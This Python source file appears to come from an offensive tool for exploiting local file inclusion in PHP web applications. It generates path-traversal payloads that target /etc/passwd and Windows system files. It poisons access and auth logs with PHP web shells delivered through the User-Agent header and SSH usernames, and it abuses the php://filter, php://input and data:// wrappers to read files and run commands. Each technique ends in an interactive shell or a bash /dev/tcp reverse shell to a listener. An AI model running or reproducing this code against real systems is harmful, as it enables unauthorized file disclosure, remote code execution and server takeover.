from utils import *
from shell import shell_session
from check_target import get_ip_info
from urllib.parse import urlunparse, urlparse, parse_qs, quote
import re
import sys
import time
import base64
import socket
import requests
import threading
import paramiko
#---------------------------------------------------Local File Inclusion-------------------------------------------------------------------#
#---------------------------------------------------Path Traversal PoC Check---------------------------------------------------------------#
def generate_traversals(os_type, depth, extra_files):
    unix_files = ["/etc/passwd"]
    windows_files = [
        "boot.ini", "\\windows\\win.ini", "\\windows\\system32\\drivers\\etc\\hosts"
    ]
    extra_files = extra_files if extra_files else []

    dots = [
        "..", ".%00.", "..%00", "..%01", ".?", "??", "?.", "%5C..", ".%2e",
        "%2e.", ".../.", "..../", "%252e%252e", "%c0%2e%c0%2e", "...."
    ]

    suffixes = ["%00", "?", " ", "%00index.html", ";index.html"]
    if os_type == "unix":
        slashes = ["/", "%2f", "0x2f", "%252f", "//"]
        prefixes = ["///", "../../../"]
        target_files = unix_files + extra_files
    elif os_type == "windows":
        slashes = ["\\", "%5c", "0x5c", "%255c", "//"]
        prefixes = ["\\\\\\", "\\.", "C:\\"]
        target_files = windows_files + extra_files
    else:
        slashes = ["/", "\\", "%2f", "%5c", "0x2f", "0x5c", "%252f", "%255c", "//"]
        prefixes = ["///", "\\\\\\", "\\.", "../../../", "C:\\"]
        target_files = unix_files + windows_files + extra_files

    traversal_patterns = [dot + slash for dot in dots for slash in slashes]
    traversal_strings = [pattern * i for pattern in traversal_patterns for i in range(1, depth + 1)]

    all_traversals = []

    for trav in traversal_strings:
        for filename in target_files:
            encoded_filename = encode_filename(filename, trav)
            if not encoded_filename.strip():
                continue

            core = trav + encoded_filename
            core = core.strip()
            all_traversals.append(core)
            for prefix in prefixes:
                prefix = prefix.strip()
                all_traversals.append(prefix + core)
            for suffix in suffixes:
                suffix = suffix.strip()
                all_traversals.append(core + suffix)
            for prefix in prefixes:
                for suffix in suffixes:
                    all_traversals.append(prefix + core + suffix)

    unique_payloads = sorted(set(all_traversals))
    return unique_payloads


def apply_traversal_to_filename(traversal, filename):
    return traversal + encode_filename(filename, traversal)


def encode_filename(filename, traversal):
    if any(s in traversal for s in ["\\", "%5c", "0x5c", "%255c"]):
        return filename.replace("/", "\\")
    return filename.replace("\\", "/")


def test_traversal(url, traversal, success_count, failure_count, tried_count, retry_payloads, successful_payloads, stop_on_success, found_success, keyword, cookie):

    parsed_url = urlparse(url)
    parsed_query = parse_qs(parsed_url.query)

    for parameter in parsed_query:
        if parsed_query[parameter][0] == "TARGET":
            parsed_query[parameter] = [traversal]


    new_query = "&".join(f"{key}={value[0]}" for key, value in parsed_query.items())
    new_url = urlunparse((
    parsed_url.scheme, parsed_url.netloc, parsed_url.path,
    parsed_url.params, new_query, parsed_url.fragment
    ))
    try:
        header =  f"User-Agent={get_random_user_agent()}"
        response = get_query(new_url, cookie, header)

        print(colored(f"Testing traversal payload: {traversal}", "yellow", attrs=["bold"]))

        is_success = False
        if response:
            if keyword:
                if keyword.lower() in response.text.lower() or "root:x" in response.text:
                    is_success = True
            else:
                if "root:x" in response.text:
                    is_success = True

        if is_success:
            print(colored(f"[+] Target is vulnerable to {traversal}\n", "green", attrs=["bold"]))
            success_count[0] += 1
            successful_payloads.append(traversal)
            if stop_on_success:
                found_success.set()
        else:
            print(colored(f"[-] Not vulnerable to {traversal}\n", "red", attrs=["bold"]))
            failure_count[0] += 1

        tried_count[0] += 1

    except Exception as e:
        print(colored(f"[!] Error while testing {traversal}\n", "magenta"))
        print(e)
        retry_payloads.append(traversal)


def path_traversal_check(args):
    success_count = [0]
    failure_count = [0]
    tried_count = [0]
    retry_payloads = []
    successful_payloads = []
    found_success = threading.Event()

    stop_on_success = args.stop_on_success or False
    keyword = args.keyword
    delay_ms = 300 if args.delay_ms is None else args.delay_ms
    max_retries = args.max_retries
    target_os = args.target_os or "unknown"
    depth = args.depth or 2
    extra_files = args.extra_files or None
    traversals = generate_traversals(os_type=target_os, depth=depth, extra_files=extra_files)
    cookie = args.cookie or ""
    def run_tests(traversals_list):
        threads = []
        for traversal in traversals_list:
            if stop_on_success and found_success.is_set():
                break

            thread = threading.Thread(
                target=test_traversal,
                args=(args.url, traversal, success_count, failure_count, tried_count, retry_payloads, successful_payloads, stop_on_success, found_success, keyword, cookie)
            )
            threads.append(thread)
            thread.start()

            if delay_ms < 0:
                time.sleep(0.3)

            elif delay_ms > 0:
                time.sleep(delay_ms / 1000.0)

        for thread in threads:
            thread.join()

    print(colored("[*] Starting initial payload test...", "blue"))
    run_tests(traversals)

    retries = 0
    while retry_payloads and retries < max_retries and not (stop_on_success and found_success.is_set()):
        print(colored(f"\n[!] Retrying failed payloads (Round {retries + 1})...", "cyan"))
        current_retry = retry_payloads.copy()
        retry_payloads.clear()
        time.sleep(3)
        run_tests(current_retry)
        retries += 1

    print(colored(f"\n[*] Total payloads tested: {tried_count[0]}", "cyan", attrs=["bold"]))
    print(colored(f"[+] Successful: {success_count[0]}", "green", attrs=["bold"]))
    print(colored(f"[x] Failed: {failure_count[0]}", "red", attrs=["bold"]))
    if retry_payloads:
        print(colored(f"[!] Payloads failed due to connection errors: {len(retry_payloads)}", "magenta", attrs=["bold"]))

    print(colored("[*]Successful payloads:\n", "yellow"))
    for payload in successful_payloads:
        print(colored(payload, "yellow", attrs=["bold"]))

#-------------------------------------------------------Access Log--------------------------------------------------------------------------#

def attempt_access_log_poisoning(url, cookie, method):
    if method == "shell_exec":
        malicious_ua = "<?php echo 'first_delimiter'; echo shell_exec($_GET['cmd']); echo 'last_delimiter'; ?>"
    elif method == "system":
        malicious_ua = "<?php echo 'first_delimiter'; echo system($_GET['cmd']); echo 'last_delimiter'; ?>"
    else:
        malicious_ua = "<?php echo 'first_delimiter'; echo exec($_GET['cmd']); echo 'last_delimiter'; ?>"

    headers = {
        'User-Agent': malicious_ua
    }

    if method in ["shell_exec","system","exec"]:
        if "?" in url:
            separator = "&"
        else:
            separator = "?"
        url = url + separator + "cmd=uptime"

    get_query(url, cookie, headers)
    response = get_query(url, cookie, get_random_user_agent())

    if response is not None and response.status_code != 404:
        output = cmd_output(response.text)
        if output is not None and "load average" in output.lower():
            return True
    return False


def access_log_poisoning(args):
    global response
    response = None

    shell_flag = False

    url = args.url
    cookie = args.cookie or ""

    if url_validation_check(url) == False:
        print(colored("[-] Please enter a valid URL format.", "red", attrs=["bold"]))
        return

    methods = ["system", "exec", "shell_exec"]
    success = {}

    for method in methods:
        print(colored(f"\n[*] Attempting access log poisoning using {method}...", "yellow", attrs=["bold"]))
        success[method] = attempt_access_log_poisoning(url, cookie, method)

        if success[method]:
            print(colored(f"\n[+] Access log poisoning successful with {method}.\n", "green", attrs=["bold"]))
            break

        else:
            print(colored(f"\n[-] Access log poisoning attempt failed using {method}.\n", "red", attrs=["bold"]))

    method_found = False
    for method in methods:
        if success.get(method, False):
            method_found = True
            break

    if not method_found:
        print(colored("\n[-] No valid method to execute commands.\n", "red", attrs=["bold"]))
        print(colored("[*] Quitting...\n", "yellow", attrs=["bold"]))
        return

    print(colored("\n[*] Press 0 to access shell environment.\n", "yellow", attrs=["bold"]))

    while True:
        cmd = input(colored("\n[>] Enter a command: ", "yellow", attrs=["bold"])).strip()

        if cmd.lower() == "exit" or cmd.lower() == "quit":
            print(colored("\n[*] Quitting...\n", "yellow", attrs=["bold"]))
            return

        if cmd == "0":
            shell_flag = True
            listener_port = get_port() or 4545
            cmd = f"/bin/bash -c \"bash -i > /dev/tcp/10.10.10.1/{listener_port} 0>&1\""

        if success.get("system") or success.get("shell_exec") or success.get("exec"):
                exec_url = url
                separator = "&" if "?" in exec_url else "?"
                exec_url += separator + "cmd=" + quote(cmd)

                if shell_flag:
                    shell_session(exec_url, cookie, get_random_user_agent(), cmd, listener_port, args)
                    return

                response = get_query(exec_url, cookie, get_random_user_agent())

        if response is not None:
            output = cmd_output(response.text)
            if output is not None:
                print(colored(output, "cyan", attrs=["bold"]))



# -----------------------------------------------------Auth.log Poisoning--------------------------------------------------------------------#
def encode_payload(payload):
    return base64.b64encode(payload.encode()).decode()


def get_ssh_port(args):
    port = args.sshport or 22
    try:
        port = int(port)
        if not 1 <= port <= 65535:
            raise ValueError("Port must be between 1 and 65535")
    except ValueError as e:
        print(colored(f"[-] Invalid SSH port: {e}", "red", attrs=["bold"]))
        sys.exit(1)
    print(colored(f"[*] Using SSH Port: {port}\n", "yellow", attrs=["bold"]))
    return port


def fake_ssh_conn(target_ip, port, payload, password):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(hostname=target_ip, port=port, username=payload, password=password)
    except (socket.error, OSError):
        print(colored(f"[-] SSH connection failed: No service on {target_ip}:{port}\n", "red", attrs=["bold"]))
    except Exception:
        pass


def attempt_auth_poisoning(url, cookie, target_ip, port, password, method):
    if method == "shell_exec_get":
        payload = "<?php echo 'first_delimiter'; echo shell_exec($_GET['cmd']); echo 'last_delimiter'; ?>"
    elif method == "system_get":
        payload = "<?php echo 'first_delimiter'; system($_GET['cmd']); echo 'last_delimiter'; ?>"
    elif method == "passthru_get":
        payload = "<?php echo 'first_delimiter'; passthru($_GET['cmd']); echo 'last_delimiter'; ?>"
    else:
        payload = "<?php echo 'first_delimiter'; system($_GET['cmd']); echo 'last_delimiter'; ?>"

    fake_ssh_conn(target_ip, port, payload, password)

    if "?" in url:
        separator = "&"
    else:
        separator = "?"
    url = url + separator + "cmd=uptime"

    response = get_query(url, cookie, get_random_user_agent())

    if response is not None and response.status_code != 404:
        output = cmd_output(response.text)
        if output is not None and "load average" in output.lower():
            return True
    return False

def auth_log_poisoning(args):
    global response
    response = None
    shell_flag = False


    url = args.url
    cookie = args.cookie or ""

    if url_validation_check(url) == False:
        print(colored("[-] Please enter a valid URL format.", "red", attrs=["bold"]))
        return

    target_ip = str(get_ip_info(url)).strip()
    port = get_ssh_port(args)
    password = "doesntmatter"

    methods = ["system_get", "shell_exec_get", "passthru_get"]
    success = {}

    for method in methods:
        print(colored(f"\n[*] Attempting auth log poisoning using {method}...", "yellow", attrs=["bold"]))
        success[method] = attempt_auth_poisoning(url, cookie, target_ip, port, password, method)

        if success[method]:
            print(colored(f"\n[+] Auth log poisoning successful with {method}.\n", "green", attrs=["bold"]))
            break
        else:
            print(colored(f"\n[-] Auth Log poisoning attempt failed using {method}.\n", "red", attrs=["bold"]))

    method_found = False
    for method in methods:
        if success.get(method, False):
            method_found = True
            break

    if not method_found:
        print(colored("\n[-] No valid method to execute commands.\n", "red", attrs=["bold"]))
        print(colored("[*] Quitting...\n", "yellow", attrs=["bold"]))
        return

    print(colored("\n[*] Press 0 to access shell environment.\n", "yellow", attrs=["bold"]))

    while True:
        cmd = input(colored("\n[>] Enter a command: ", "yellow", attrs=["bold"])).strip()

        if cmd.lower() == "exit" or cmd.lower() == "quit":
            print(colored("\n[*] Quitting...\n", "yellow", attrs=["bold"]))
            return

        if cmd == "0":
            shell_flag = True
            listener_port = get_port() or 4545
            cmd = f"/bin/bash -c \"bash -i > /dev/tcp/10.10.10.1/{listener_port} 0>&1\""


        cmd_b64 = encode_payload(cmd)

        if success.get("system_get") or success.get("passthru_get") or success.get("shell_exec_get"):
                exec_url = url
                separator = "&" if "?" in exec_url else "?"
                exec_url += separator + "cmd=" + quote(cmd)

                if shell_flag:
                   shell_session(exec_url, cookie, get_random_user_agent(), cmd_b64, listener_port, args)
                   return

                response = get_query(exec_url, cookie, get_random_user_agent())

        if response is not None:
            output = cmd_output(response.text)
            if output is not None:
                output = output.strip()
                if output:
                    print(colored(output, "cyan", attrs=["bold"]))

# -------------------------------------------------------php://filter--------------------------------------------------------------------------#
def is_base64(data):
    try:
        decoded = base64.b64decode(data, validate=True)
        return len(decoded) > 0
    except Exception:
        return False


def extract_phpfilter_data(data):
    dec = []
    longest_string = ""
    possible_base64_strings = re.findall(r"[A-Za-z0-9+/=]+", data)

    for b64_str in possible_base64_strings:
        if len(b64_str) % 4 == 0 and is_base64(b64_str):
            dec.append(b64_str)

            if len(b64_str) > len(longest_string):
                longest_string = b64_str

    return longest_string


def php_filter(args):
    qurl = args.url
    file_path = args.file
    cookie = args.cookie or ""

    if not url_validation_check(qurl):
        print(colored("[-] Invalid URL format.", "red", attrs=["bold"]))
        return

    qurl = reformat_url(qurl)
    file_path_encoded = quote(file_path)
    filter_str = "php://filter/convert.base64-encode/resource="
    new_url = qurl + filter_str + file_path_encoded

    print(colored(f"[*] Fetching from: {new_url}", "yellow", attrs=["bold"]))

    result = get_query(new_url, cookie, get_random_user_agent())
    if not result:
        print(colored("[!] No response received.", "red", attrs=["bold"]))
        return

    result_cleaned = result.text.replace("\n", "").replace("\r", "")
    encoded_content = extract_phpfilter_data(result_cleaned)

    if encoded_content:
        try:
            decoded_content = base64.b64decode(encoded_content).decode("utf-8", errors="ignore")
            print(colored(f"\n[+] Decoded content of ", "green"), end="")
            print(colored(f"{file_path}:\n", "green", attrs=["bold"]))
            print(colored(decoded_content, "cyan"))
        except:
            print(colored("[!] Decoding failed.", "red", attrs=["bold"]))
    else:
        print(colored(f"[!] No information leak detected at {new_url}", "red", attrs=["bold"]))


# ------------------------------------------------------php://input--------------------------------------------------------------------------#
def generate_payload(cmd_b64, method):
    return f"<?php echo 'first_delimiter'; echo {method}(base64_decode('{cmd_b64}')); echo 'last_delimiter'; ?>"


def check_post_accept(args):
    url = args.url
    cookie = args.cookie or ""

    if not url_validation_check(url):
        print(colored("[-] Please enter a valid URL format.", "red", attrs=["bold"]))
        return

    url = reformat_url(url).strip()
    print(colored(f"\n[*] Checking if {url} accepts POST requests...", "yellow", attrs=["bold"]))

    header = {"Content-Type": "application/x-www-form-urlencoded"}
    if not post_query(url, cookie, header, "test=1", ""):
        print(colored("\n[-] Target does not seem to allow POST requests. Exploit might fail.", "red", attrs=["bold"]))
        return

    print(colored("\n[+] Target supports POST requests! Attempting exploit...\n", "green", attrs=["bold"]))
    PHPinput_command_exec(url, cookie, args)


def PHPinput_command_exec(url, cookie, args):
    print(colored("\n[*] Attempting to execute shell commands using shell_exec() and system() functions.", "yellow", attrs=["bold"]))

    header = {"Content-Type": "application/x-www-form-urlencoded"}
    target_url = f"{url}php://input"
    user_agent = get_random_user_agent()

    for method in ["shell_exec", "system"]:
        payload = f"<?php echo 'first_delimiter'; echo {method}('id'); echo 'last_delimiter'; ?>"
        if attempt_command_exec(target_url, cookie, header, payload, method):
            interactive_shell_loop(target_url, cookie, method, user_agent, args)
            return

    print(colored("\n[-] Neither shell_exec() nor system() were successful.\n", "red", attrs=["bold"]))


def attempt_command_exec(url, cookie, header, payload, method):
    response = post_query(url, cookie, header, payload, "")
    if response and response.status_code != 404:
        output = cmd_output(response.text)
        if output and ("uid" in output or "gid" in output):
            print(colored(f"\n[+] The command execution with {method} was successful.", "green", attrs=["bold"]))
            return True
    return False


def interactive_shell_loop(url, cookie, method, user_agent, args):
    header = {"Content-Type": "application/x-www-form-urlencoded"}
    print(colored("\n[*] Press 0 to access shell environment.\n", "yellow", attrs=["bold"]))

    while True:
        cmd = input(colored("\n[>] Enter a command: ", "yellow", attrs=["bold"])).strip()
        if cmd.lower() in ["exit", "quit"]:
            print(colored("\n[*] Quitting...\n", "yellow", attrs=["bold"]))
            return

        if not cmd:
            continue

        shell_flag = False
        if cmd == "0":
            shell_flag = True
            listener_port = get_port()
            cmd = f"/bin/bash -c \"bash -i > /dev/tcp/10.10.10.1/{listener_port} 0>&1\""

        cmd_b64 = base64.b64encode(cmd.encode()).decode()
        payload = generate_payload(cmd_b64, method)

        if shell_flag:
            shell_session(url, cookie, user_agent, payload, listener_port, args)
            return

        try:
            response = post_query(url, cookie, header, payload, "")
            if response:
                output = cmd_output(response.text)
                print(colored(output, "cyan", attrs=["bold"]))
        except requests.RequestException:
            print(colored("\n[-] Error executing command", "red", attrs=["bold"]))



# -------------------------------------------------------php://data--------------------------------------------------------------------------#

def send_wrapper_data_cmd(url, cookie, format_name, format_payload):
    qurl = url + format_payload
    print(colored(f"[*] Trying {format_name} format...", "yellow"))
    response = get_query(qurl, cookie, get_random_user_agent())
    if response:
        output = cmd_output(response.text)
        if output and ("uid" in output or "gid" in output):
            print(colored(f"[+] {format_name} format was successful.\n", "green"))
            return True, format_name, format_payload
        else:
            print(colored(f"[-] {format_name} format was not successful.\n", "red"))
    return False, None, None


def find_data_payload(url, cookie):
    cmd = "<?php echo 'first_delimiter'; system('id'); echo 'last_delimiter'; ?>"
    encmd = base64.b64encode(cmd.encode()).decode()
    encmd_url = quote(encmd)

    formats = {
        "data:,": f"data:,{cmd}",
        "data://,": f"data://,{cmd}",
        "data:text/plain;base64,": f"data:text/plain;base64,{encmd_url}",
        "data://text/plain;base64,": f"data://text/plain;base64,{encmd_url}"
    }

    for name, payload in formats.items():
        success, format_name, format_payload = send_wrapper_data_cmd(url, cookie, name, payload)
        if success:
            return format_name, format_payload

    return None, None


def execute_data_command(url, cookie, format_name, args):
    shell_flag = False
    print(colored(f"[*] Command execution started with format: {format_name}\n", "green"))
    print(colored("[*] Press 0 to access shell environment.", "yellow"))

    while True:
        cmd = input(colored("Enter a command : ", "yellow")).strip()
        if cmd.lower() in ["exit", "quit"]:
            print(colored("[*] Quitting...", "yellow"))
            break

        if cmd == "0":
            shell_flag = True
            listener_port = get_port() or 4545

            if "base64" not in format_name:
                cmd = f"/bin/bash -c \"bash -i > /dev/tcp/10.10.10.1/{listener_port} 0>%261\""

            else:
                cmd = f"/bin/bash -c \"bash -i > /dev/tcp/10.10.10.1/{listener_port} 0>&1\""

            cmd = cmd.replace("'", "\\'")

        if not cmd:
            continue

        try:
            php_cmd = f"<?php echo 'first_delimiter'; system('{cmd}'); echo 'last_delimiter'; ?>"
            encmd = base64.b64encode(php_cmd.encode()).decode()
            encmd_url = quote(encmd)

            if "base64" in format_name:
                if format_name == "data:text/plain;base64,":
                    payload = f"data:text/plain;base64,{encmd_url}"
                else:
                    payload = f"data://text/plain;base64,{encmd_url}"
            else:
                if format_name == "data:,":
                    payload = f"data:,{php_cmd}"
                else:
                    payload = f"data://,{php_cmd}"

            qurl = url + payload

            if shell_flag:
                shell_session(qurl, cookie, get_random_user_agent(), payload, listener_port, args)
                return

            response = get_query(qurl, cookie, get_random_user_agent())

            if response:
                output = cmd_output(response.text)
                print(colored(output, "cyan"))

        except requests.RequestException:
            print(colored("[-] Error executing command", "red"))


def php_data_wrapper(args):
    url = args.url
    cookie = args.cookie or ""
    if url_validation_check(url) == False:
        print(colored("[-] Please enter a valid URL format.", "red", attrs=["bold"]))
        return
    url = reformat_url(url)
    url = url.strip()

    format_name, format_payload = find_data_payload(url, cookie)
    if format_name:
        print(colored(f"[*] Using successful format: {format_name}", "green"))
        execute_data_command(url, cookie, format_name, args)
    else:
        print(colored("[-] No working data:// format found.", "red"))


#--------------------------------------------------Remote File Inclusion--------------------------------------------------------------------#






